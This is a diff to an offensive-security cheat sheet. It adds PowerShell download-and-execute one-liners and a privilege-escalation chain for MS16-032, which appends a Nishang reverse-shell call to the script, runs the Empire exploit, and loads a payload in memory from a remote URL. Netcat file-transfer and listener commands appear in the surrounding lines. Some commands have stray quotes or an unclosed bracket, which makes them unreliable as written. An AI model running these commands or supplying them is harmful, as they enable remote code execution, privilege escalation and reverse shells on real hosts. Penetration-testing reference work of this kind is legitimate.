@@ -12,13 +12,17 @@ Linux Listener: <code>nc -lnvp [PORT]</code>
 
 Windows Listener: <code>nc.exe -lnvcp [PORT]</code>
 
+### Download Files with PowerShell
+
+<code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>
+
+<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')"</code>
+
 ### Upload / Download files with Netcat
 
 Download: <code>nc -lnvp [PORT] > [OUT_FILE]</code>
 
 Upload: <code>nc -nv [IP] [PORT] < [IN_FILE]</code>
-
-## Reverse Shells
 
 [Reverse Shells](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 
@@ -187,6 +191,28 @@ Use listener
 ### MS08-067
 
 Use exploit found [here](https://github.com/andyacer/ms08_067)
+
+## PowerShell Privilege Escalation
+
+Both [Nishang](https://github.com/samratashok/nishang) and [Empire](https://github.com/EmpireProject/Empire) have a suite of PowerShell tools.
+
+### MS16-032
+
+Use the Empire [Invoke-MS16-032.ps1](https://github.com/EmpireProject/Empire/blob/master/data/module_source/privesc/Invoke-MS16032.ps1)
+
+Use Nishang's [Invoke-PowerShellTcp.ps1](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1) for reverse shell payload.
+
+Add the following line to the bottom of the Invoke-PowerShellTcp.ps1 script:
+
+<code>Invoke-PowerShellTcp -Reverse -IPAddress [LOCAL_IP] -Port [PORT]</code>
+
+Add the following to the bottom of the Invoke-MS16-032 script:
+
+<code>Invoke-MS16-032 -Command "IEX(New-Object Net.WebClient).DownloadString('[URL]/[REVERSEHLL_PAYLOAD')"</code>
+
+Execute on the host by running the following:
+
+<code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]/Invoke-MS16-032.ps1')"
 
 #### Payloads
 
